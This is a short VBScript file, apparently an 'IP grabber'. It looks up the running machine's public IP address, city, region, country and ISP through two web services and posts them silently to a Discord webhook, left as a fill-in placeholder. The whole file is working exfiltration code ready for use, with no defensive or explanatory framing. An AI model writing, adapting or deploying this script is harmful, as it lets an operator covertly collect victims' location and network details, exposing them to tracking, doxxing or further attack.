' Set up variables
Dim xhr, ipInfoUrl, ipInfo, city, region, country, isp, postData, webhookUrl, ipAddress

' Set the IP Info API URL
ipInfoUrl = "http://ip-api.com/xml/"

' Get the IP Info for the current machine
Set xhr = CreateObject("MSXML2.XMLHTTP")
xhr.Open "GET", ipInfoUrl, False
xhr.Send
Set ipInfo = xhr.responseXML

' Get the relevant IP Info data
city = ipInfo.getElementsByTagName("city")(0).Text
region = ipInfo.getElementsByTagName("region")(0).Text
country = ipInfo.getElementsByTagName("country")(0).Text
isp = ipInfo.getElementsByTagName("isp")(0).Text

' Get the public IP address of the current machine
Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
objHTTP.Open "GET", "http://ipinfo.io/ip", False
objHTTP.Send
ipAddress = objHTTP.responseText

' Set up the post data for the Discord webhook
postData = "{""embeds"":[{""title"":""IP Info"",""description"":""city | region | country  | isp  | ip "",""color"":3066993,""fields"":[{""name"":""City"",""value"":""" & city & """,""inline"":true},{""name"":""Region"",""value"":""" & region & """,""inline"":true},{""name"":""Country"",""value"":""" & country & """,""inline"":true},{""name"":""ISP"",""value"":""" & isp & """,""inline"":true},{""name"":""IP Address"",""value"":""" & ipAddress & """,""inline"":true}]}]}"

' Set the Discord webhook URL
webhookUrl = "YOURWEBHOOKURLHERE"

' Send the post data to the Discord webhook
Set xhr = CreateObject("MSXML2.XMLHTTP")
xhr.Open "POST", webhookUrl, False
xhr.setRequestHeader "Content-Type", "application/json"
xhr.Send postData
